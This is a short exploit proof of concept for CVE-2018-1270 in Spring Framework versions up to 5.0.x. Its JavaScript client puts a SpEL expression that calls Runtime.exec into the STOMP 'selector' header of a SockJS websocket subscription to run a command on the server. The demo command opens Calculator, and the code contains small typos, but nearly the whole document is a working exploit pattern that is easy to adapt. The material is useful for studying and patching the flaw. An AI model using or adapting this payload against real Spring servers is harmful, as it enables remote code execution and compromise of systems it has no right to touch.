# Exploit Author: JameelNabbo
# Website: jameelnabbo.com <http://jameelnabbo.com/>
# Vendor Homepage:
# CVE: CVE: CVE-2018-1270
# Version: <= 5.0.x 
 
# Description: By connecting to spring STOMP, and putting the key for "selector" 
# header, we can execute code on Spring.
 
# POC:
# Here&#039; we are writting java commands to be executed within the selector header
# Connecting to a web socket using SockJS
# Ref: https://docs.spring.io/spring/docs/current/spring-framework-reference/web.html#websocket-stomp-enable
 
var header = {"selector":"T(java,lang.Runtime).getRuntime().exec(&#039;open -a Calculator"};
 
var socket = new SockJS(&#039;/gs-guide-websocket&#039;);
var stompClient = webstomp.over(socket);
stompClient.connect({}, function (frame){
    setConnected(true);
    console.log(&#039;Connected: &#039; + frame);
    stompClient.subscribe(&#039;/topic/greetings&#039;, function(greeting){
        showGreeting(JSON.parse(greeting.body).content);
        },header);
});

